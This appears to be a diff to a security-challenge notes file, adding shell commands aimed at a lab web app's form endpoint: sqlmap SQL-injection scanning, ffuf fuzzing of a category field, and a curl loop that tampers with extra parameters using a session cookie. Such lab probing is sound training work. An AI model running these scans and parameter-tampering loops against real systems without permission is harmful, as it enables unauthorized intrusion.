@@ -16,3 +16,16 @@ sqlmap -u "$BASE/alta" --method=POST --data="nombre=test&categoria=Catering" -p 
 BASE='https://chl-3080b01d-bb9c-4e54-bf7f-06f64c3e6d9a-cuentas-claras.b.softwareseguro.com.ar'
 # wordlist grande de español
 ffuf -u "$BASE/alta" -X POST -d "nombre=x&categoria=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -mc all -ac -t 20 2>/dev/null | head -20
+
+
+COOKIE='session=PEGÁ_TU_SESSION'
+BASE='https://chl-3080b01d-bb9c-4e54-bf7f-06f64c3e6d9a-cuentas-claras.b.softwareseguro.com.ar'
+
+for cat in "IVA" "AFIP" "ABL" "Impuesto al Cheque"; do
+  for extra in "" "&proveedor=1" "&proveedor_id=1" "&id=1" "&pid=1" "&contar=1" "&force=1"; do
+    r=$(curl -s -b "$COOKIE" "$BASE/alta" \
+      --data-urlencode "nombre=x" --data-urlencode "categoria=$cat" \
+      -d "$extra" | grep -oiE "flash[^>]*>[^<]+" | head -1)
+    echo "[$cat $extra] -> $r"
+  done
+done
